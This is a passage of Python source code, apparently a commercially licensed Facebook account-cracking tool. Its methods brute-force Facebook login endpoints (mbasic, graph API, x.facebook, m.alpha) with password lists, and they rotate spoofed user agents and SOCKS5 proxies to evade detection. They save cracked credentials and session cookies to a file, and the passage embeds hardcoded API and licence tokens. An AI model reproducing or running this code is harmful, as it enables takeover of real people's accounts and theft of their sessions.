                    tree.add(f'{H2}datr={yks};fr={oki}.{aku}-afQ.BlI_uc.RF.AAA.0.0.BlI_ue.AWUYe_6NjBs;sb=nPsjZdKo9oc7j_kfJXkvnzP3;c_user={uid};xs=36%3AxLvEctHCA8waJQ%3A2%3A1696856991%3A-1%3A{str(random.randint(10000,99999))} {ua}')
                    prints(tree)
                    kntl = (f"[✓] {uid}|{pw}")
                    self.cp.append(kntl)
                    with open("OK/live.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f" [light_steel_blue][ {H2}SCF[light_steel_blue] ] {H2}{str(self.loop)}{P2}/{K2}{len(self.id)}{P2} OK / CP [light_steel_blue][ {H2}{len(self.ok)}[/] - {K2}{len(self.cp)} [light_steel_blue]] [light_steel_blue][ {H2}{self.waktu}{P2} [light_steel_blue]]")
               prog.advance(des)
               sleep(15)
       self.loop+=1

   def GenerateUserAgent_redmi(self):
       rr = random.randint
       rc = random.choice
       build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
       redmi1 = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; XIAOMI Redmi 6A Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,99))}.0.{str(rr(3500,3900))}.{str(rr(75,199))} Mobile Safari/537.36 AlohaBrowser/2.{str(rr(7,59))}.1"
       redmi2 = f"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus Build/OPM1.{str(rr(100000,199999))}.019; ru-ru) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,99))}.0.{str(rr(3000,3999))}.{str(rr(75,199))} Mobile Safari/537.36 Puffin/9.7.2.{str(rr(50000,59999))}AP"
       redmi3 = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Redmi Note {str(rr(4,7))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,99))}.0.{str(rr(3000,3999))}.{str(rr(75,99))} Mobile Safari/537.36"
       xixixi = rc([redmi1, redmi2, redmi3])
       return xixixi

   def Mbasicc__(self, uid, pasw):
       prog.update(des,description=f" [light_steel_blue][ {H2}SCF[light_steel_blue] ] {H2}{str(self.loop)}{P2}/{K2}{len(self.id)}{P2} OK / CP [light_steel_blue][ {H2}{len(self.cp)}[/] - {K2}{len(self.ok)} [light_steel_blue]] [light_steel_blue][ {H2}{self.waktu}{P2} [light_steel_blue]]")
       prog.advance(des) 
       ses = requests.Session()
       for pw in pasw:
           try:
               if 'iya' in self.ua_kamu : ua = self.ua_manual[0]
               else:ua = random.choice(userAgent2)
               port = random.choice(self.prox)
               proxylist = {'http': 'socks5://'+port}
               p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
               ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
               data = {"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw}
               kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
               headers = {'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
               response = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', headers = headers, data = data, cookies = {'cookie': kuki}, allow_redirects=True)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{K2}{uid}|{pw}|{cektahun(uid)}")
                  tree.add(f'{K2}{ua} {ua}')
                  prints(tree)
                  kntl = (f"[✓] {uid}|{pw}|{kuki}")
                  self.ok.append(kntl)
                  with open("OK/live.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    yks = (''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(22)))
                    ytol = (''.join(random.choice('1234567890abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(17)))
                    jasmin = (''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(12)))
                    fdx = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(5)))
                    pls = (''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(11)))
                    oka = (''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for y in range(6)))
                    itil = (''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(23)))
                    xcs = (''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
                    pwz = (''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(9)))
                    aze = (''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(5)))
                    aok = (''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
                    tree = Tree(f"\r",guide_style="bold grey100")
                    tree.add(f"{H2}{uid}|{pw}|{cektahun(uid)}")
                    tree.add(f'{H2}datr={yks}-H;fr={ytol}.{fdx}_{jasmin}-nKx-{aze}.{aok}.al.AAA.0.0.{oka}.{pls};sb={itil};c_user={uid};xs=1%{pwz}_{xcs}%3A2%3A{str(random.randint(1000000000,9999999999))}%3A-1%3A{str(random.randint(10000,90000))};m_page_voice={uid}')
                    prints(tree)
                    kntl = (f"[✓] {uid}|{pw}")
                    self.cp.append(kntl)
                    with open("OK/live.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f" [light_steel_blue][ {H2}SCF[light_steel_blue] ] {H2}{str(self.loop)}{P2}/{K2}{len(self.id)}{P2} OK / CP [light_steel_blue][ {H2}{len(self.ok)}[/] - {K2}{len(self.cp)} [light_steel_blue]] [light_steel_blue][ {H2}{self.waktu}{P2} [light_steel_blue]]")
               prog.advance(des)
               sleep(15)
       self.loop+=1
   
   def GenerateUserAgent_dalvik(self):
       self.build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
       self.android = random.choice(["5.1.1 ","4.4.2", "4.4.4", "7.1.2", "7.0", "8.0.0", "8.1.0", "6.0", "6.0.1"])
       return(f"Dalvik/2.1.0 (Linux; U; Android {self.android}; vivo V3Max Build/{self.build}) [FBAN/Orca-Android;FBAV/{str(random.randint(200,299))}.0.0.{str(random.randint(0,99))}.{str(random.randint(75,299))};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{str(random.randint(100000000,999999999))};FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{self.android};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=3.0,width=1080,height=1920")
   
   def graph_Apiiii(self, uid, pasw):
        prog.update(des,description=f" [light_steel_blue][ {H2}SCF[light_steel_blue] ] {H2}{str(self.loop)}{P2}/{K2}{len(self.id)}{P2} OK / CP [light_steel_blue][ {H2}{len(self.ok)}[/] - {K2}{len(self.cp)} [light_steel_blue]] [light_steel_blue][ {H2}{self.waktu}{P2} [light_steel_blue]]")
        prog.advance(des)
        for pw in pasw:
            try:
                ses = requests.Session()
                if 'iya' in self.ua_kamu : ua = self.ua_manual[0]
                else:ua = self.GenerateUserAgent_dalvik()
                params = {"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16", "sdk_version": {random.randint(1,26)}, "email": uid, "locale": "en_US", "password": pw, "sdk": "android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
                headers = {"Host": "graph.facebook.com", "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), "x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
                response = ses.post("https://graph.facebook.com/auth/login", params = params, headers = headers, allow_redirects=False).json()
                if "session_key" in response:
                   cokz = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                   ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                   coki = f"sb={ssbb};{cokz}"
                   tree = Tree(f"\r",guide_style="bold grey100")
                   tree.add(f"{H2}{uid} • {pw} • {cektahun(uid)}")
                   tree.add(f'{H2}{coki} {ua}')
                   prints(tree)
                   kntl = (f"[✓] {uid}|{pw}|{coki}")
                   self.ok.append(kntl)
                   with open("OK/live.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                   break
                elif "www.facebook.com" in response["error"]["message"]:
                    tree = Tree(f"\r",guide_style="bold grey100")
                    tree.add(f"{K2}{uid} • {pw} • {cektahun(uid)}")
                    tree.add(f'{K2}{ua}')
                    prints(tree)
                    kntl = (f"[X] {uid}|{pw}")
                    self.cp.append(kntl)
                    with open("CP/check.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "Calls to this api have exceeded the rate limit. (613)" in response:
                    prog.update(des,description=f" [light_steel_blue][ {H2}SCF[light_steel_blue] ] {H2}{str(self.loop)}{P2}/{K2}{len(self.id)}{P2} OK / CP [light_steel_blue][ {H2}{len(self.ok)}[/] - {K2}{len(self.cp)} [light_steel_blue]] [light_steel_blue][ {H2}{self.waktu}{P2} [light_steel_blue]]")
                    prog.advance(des)
                    sleep(15)
            except requests.exceptions.ConnectionError as e:
                prog.update(des,description=f" [light_steel_blue][ {H2}SCF[light_steel_blue] ] {H2}{str(self.loop)}{P2}/{K2}{len(self.id)}{P2} OK / CP [light_steel_blue][ {H2}{len(self.ok)}[/] - {K2}{len(self.cp)} [light_steel_blue]] [light_steel_blue][ {H2}{self.waktu}{P2} [light_steel_blue]]")
                prog.advance(des)
                sleep(15)
        self.loop+=1
   
   def GenerateUserAgent_Ran(self):
       buildz = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
       ua1 = f"Mozilla/5.0 (Linux; Android {str(random.randint(7,12))}; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.{str(random.randint(3500,3999))}.62 Mobile Safari/537.36"
       ua2 = f"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N920G Build/{buildz}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.4 Chrome/{str(random.randint(35,99))}.0.{str(random.randint(2000,2999))}.{str(random.randint(75,150))} Mobile Safari/537.36"
       ua3 = f"Mozilla/5.0 (Linux; Android 13; 23013RK75C Build/TKQ1.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.{str(random.randint(5000,5900))}.{str(random.randint(75,99))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(random.randint(400,499))}.0.0.30.{str(random.randint(75,199))};]"
       asxz = random.choice([ua1,ua2,ua3])
       return asxz

   def Messenger____(self, uid, pasw):
       prog.update(des,description=f" [light_steel_blue][ {H2}SCF[light_steel_blue] ] {H2}{str(self.loop)}{P2}/{K2}{len(self.id)}{P2} OK / CP [light_steel_blue][ {H2}{len(self.cp)}[/] - {K2}{len(self.ok)} [light_steel_blue]] [light_steel_blue][ {H2}{self.waktu}{P2} [light_steel_blue]]")
       prog.advance(des) 
       ses = requests.Session()
       for pw in pasw:
           try:
               if 'iya' in self.ua_kamu : ua = self.ua_manual[0]
               else:ua = opera()
               port = random.choice(self.prox)
               proxylist = {'http': 'socks5://'+port}
               link = ses.get(f"https://x.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&wtsid=rdr_0UE6d0nZLTL3qIKGt&refsrc=deprecated&_rdr")
               data = {'lsd': re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),'uid': uid,'next': 'https://x.facebook.com/login/save-device/','flow': 'login_no_pin','pass': pw,'email': uid}
               headers = {'Host': 'x.facebook.com','content-length': '154','cache-control': 'max-age=0','viewport-width': '980','sec-ch-ua': '''Not?A_Brand';v='8', 'Chromium';v='108', 'Google Chrome';v='108''','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': 'Android','sec-ch-prefers-color-scheme': 'light','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://x.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://x.facebook.com/login/save-device/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
               response = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0",headers = headers, data = data, proxies = proxylist, allow_redirects=True)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{K2}{uid}|{pw}|{cektahun(uid)}")
                  tree.add(f'{K2}{ua} {ua}')
                  prints(tree)
                  kntl = (f"[✓] {uid}|{pw}|{kuki}")
                  self.ok.append(kntl)
                  with open("OK/live.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    sma = random.randint(1000000000,9999999999)
                    asu = (''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890') for y in range(8)))
                    itil = (''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890') for y in range(5)))
                    jars = (''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZopqrstuvwxyz1234567890') for y in range(9)))
                    enem = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890') for y in range(16)))
                    pitu = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890') for y in range(17)))
                    ykh = (''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890') for y in range(6)))
                    gijil = (''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890') for y in range(12)))
                    peler = (''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890') for y in range(7)))
                    akp = (''.join(random.choice('ABCDEFGHIJKLMNOUVWXYZabcdefghijklmnopqrstuvwxyz1234567890') for y in range(6)))
                    aso = (''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890') for y in range(6)))
                    oks = (''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890') for y in range(11)))
                    tree = Tree(f"\r",guide_style="bold grey100")
                    tree.add(f"{H2}{uid}|{pw}|{cektahun(uid)}")
                    tree.add(f"{H2}sb={asu}-{itil}_{jars};c_user={uid};xs=21%{enem}%3A2%3A{sma}%3A-1%3A{str(ramdom.randint(10000,90000))};fr={pitu}.{ykh}_{gijil}_{peler}.{akp}.hK.AAA.0.0.{aso}.{oks};m_page_voice={uid} {ua}")
                    prints(tree)
                    kntl = (f"[✓] {uid}|{pw}")
                    self.cp.append(kntl)
                    with open("OK/live.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f" [light_steel_blue][ {H2}SCF[light_steel_blue] ] {H2}{str(self.loop)}{P2}/{K2}{len(self.id)}{P2} OK / CP [light_steel_blue][ {H2}{len(self.ok)}[/] - {K2}{len(self.cp)} [light_steel_blue]] [light_steel_blue][ {H2}{self.waktu}{P2} [light_steel_blue]]")
               prog.advance(des)
               sleep(15)
       self.loop+=1
   
   def Alphaaam_(self, uid, pasw):
       prog.update(des,description=f" [light_steel_blue][ {H2}SCF[light_steel_blue] ] {H2}{str(self.loop)}{P2}/{K2}{len(self.id)}{P2} OK / CP [light_steel_blue][ {H2}{len(self.ok)}[/] - {K2}{len(self.cp)} [light_steel_blue]] [light_steel_blue][ {H2}{self.waktu}{P2} [light_steel_blue]]")
       prog.advance(des) 
       ses = requests.Session()
       for pw in pasw:
           try:
               if 'iya' in self.ua_kamu : ua = self.ua_manual[0]
               else:ua = random.choice(userAgent2)
               port = random.choice(self.prox)
               proxylist = {'http': 'socks5://'+port}
               p = ses.get("https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fm.alpha.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D274266067164%26cbt%3D1675237736936%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df33eeedf0d23c74%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%26client_id%3D274266067164%26display%3Dtouch%26domain%3Did.pinterest.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.pinterest.com%252Flogin%26locale%3Did_ID%26logger_id%3Df27fa04cd920e98%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96f44d15f7ea8%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%2526frame%253Df7efd9d84b96a8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%252Cuser_friends%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
               ses.headers.update({"Host": "m.alpha.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
               data = {'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
               kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
               headers = {"Host": "m.alpha.facebook.com","content-length": f"{len(str(data))}","x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),"origin": "https://m.alpha.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "*/*","x-requested-with": "com.microsoft.bing","sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","referer": "https://m.alpha.facebook.com/v2.7/dialog/oauth?app_id=274266067164&cbt=1675237736936&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df33eeedf0d23c74%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener&client_id=274266067164&display=touch&domain=id.pinterest.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fid.pinterest.com%2Flogin&locale=id_ID&logger_id=f27fa04cd920e98&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail%2Cuser_birthday%2Cuser_friends&sdk=joey&version=v2.7&ret=login&fbapp_pres=0&tp=unspecified","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
               response = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data = data, cookies = {'cookie': kuki}, headers = headers, proxies = proxylist, allow_redirects=False)
               if "c_user" in ses.cookies.get_dict():
                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f"{H2}{uid}|{pw}|{cektahun(uid)}")
                  tree.add(f'{H2}{kuki} {ua}')
                  prints(tree)
                  kntl = (f"[✓] {uid}|{pw}|{kuki}")
                  self.ok.append(kntl)
                  with open("OK/live.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                  break
               elif "checkpoint" in ses.cookies.get_dict():
                    tree = Tree(f"\r",guide_style="bold grey100")
                    tree.add(f"{K2}{uid}|{pw}|{cektahun(uid)}")
                    tree.add(f"{K2}{ua}")
                    prints(tree)
                    kntl = (f"[X] {uid}|{pw}")
                    self.cp.append(kntl)
                    with open("CP/check.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
               else:
                    continue
           except requests.exceptions.ConnectionError as e:
               prog.update(des,description=f" [light_steel_blue][ {H2}SCF[light_steel_blue] ] {H2}{str(self.loop)}{P2}/{K2}{len(self.id)}{P2} OK / CP [light_steel_blue][ {H2}{len(self.ok)}[/] - {K2}{len(self.cp)} [light_steel_blue]] [light_steel_blue][ {H2}{self.waktu}{P2} [light_steel_blue]]")
               prog.advance(des)
               sleep(15)
       self.loop+=1
	
class Lisensi:
   
   #- Init Self -#
   def __init__(self):
       self.ses       = requests.Session()
       self.url        = 'https://app.cryptolens.io'
       self.token     = 'WyI2NzkxMDY1OCIsInRudmtMdy9KbmZseEtOR2swblVjSktKT2JkN2RJQXU1NzNFa1REYUEiXQ=='
       self.bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
       self.ProductId = '22785'

   #- Animasi -#
   def animasi(self):
       exec = [f"[ {M2}■{P2}□□□□□□□□□ ]",f"[ {K2}■■{P2}□□□□□□□□ ]", f"[ {H2}■■■{P2}□□□□□□□ ]", f"[ {J2}■■■■{P2}□□□□□□ ]", f"[ {N2}■■■■■{P2}□□□□□ ]", f"[ {B2}■■■■■■{P2}□□□□ ]", f"[ {O2}■■■■■■■{P2}□□□ ]", f"[ {A2}■■■■■■■■{P2}□□ ]", f"[ {H2}■■■■■■■■■{P2}□ ]", f"[ {U2}■■■■■■■■■■{P2} ]"]
       for bool in range(50):
           sleep(0.1)
           Console().print(f'\r  {P2}[{H2}+{P2}] please wait... ' + exec[bool % len(exec)] +'',end='\r')

   #- Clear Terminal -#
   def clearTerminal(self, platform):
       if "linux" in sys.platform.lower():os.system("clear")
       elif "win" in sys.platform.lower():os.system("cls")
   
   #- Delete Lisensi -#
   def removeLisensi(self):
       try:os.system('rm -rf data/.LisensiLog.json')
       except:pass

   #- WhatsApp Admin -#
   def WhatsApp(self):
       prints(Panel(f'''{P2}[{H2}+{P2}] tunggu sebentar anda akan di arahkan ke WhatsApp admin''',width=80,padding=(0,1),style=f"light_steel_blue"))
       try:
           self.wa = os.system("xdg-open https://wa.me/+6283861183874?text=Assalamualaikum%20bang%20beli%20lisensi%20SCF-TOOLS%20nya%20dong")
           return self.wa
       except:pass
   
   #- Logo -#
   def Logooo(self):
       prints(Panel(f''' {H2}___   ___        ___        ___ 
|   |=|_.'   .'|=|_.'   .'|=|_.' 
`.  |      .'  |      .'  |  ___ 
  `.|=|`.  |   |      |   |=|_.' 
 ___  |  `.`.  |  ___ |   |      
 `._|=|___|  `.|=|_.' |___|\n      
      {P2}@AdityaExec_ | SCF                                ''',width=80,padding=(1,18),title=f"{M2}● {K2}● {H2}●",title_align=f"{str(random.choice(['right', 'left']))}",style="light_steel_blue"))
   
   #- Halaman Paste Lisensi -#
   def pasteLisen(self):
       self.clearTerminal(platform) ; self.Logooo()
       prints(Panel(f'''{P2}[{H2}+{P2}] silahkan masukkan lisensi tools yang anda miliki ya\n{P2}[{H2}+{P2}] belum mempunyai lisensi? ketik {P2}( {H2}beli{P2} ) untuk melihat harga''',width=80,padding=(0,1),style=f"light_steel_blue"))
       set = Console().input(f'  {P2}[{H2}?{P2}] masukan lisensi tools : ')
       if set =='' or set =='':
         prints(Panel(f'''{P2}[{M2}!{P2}] opshhh silahkan masukan lisensi anda dan jangan kosong''',width=80,padding=(0,1),style=f"light_steel_blue"))
         sleep(3) ; self.pasteLisen()
       elif set =='beli' or set =='Beli' or set =='BELI':self.Harga()
       try:
            search = self.ses.get(f'''{self.url}/api/key/Activate?token={self.token}&ProductId={self.ProductId}&Key={set}&Sign=True''').json()['licenseKey']['key']
            open("data/.LisensiLog.json","w").write(set)
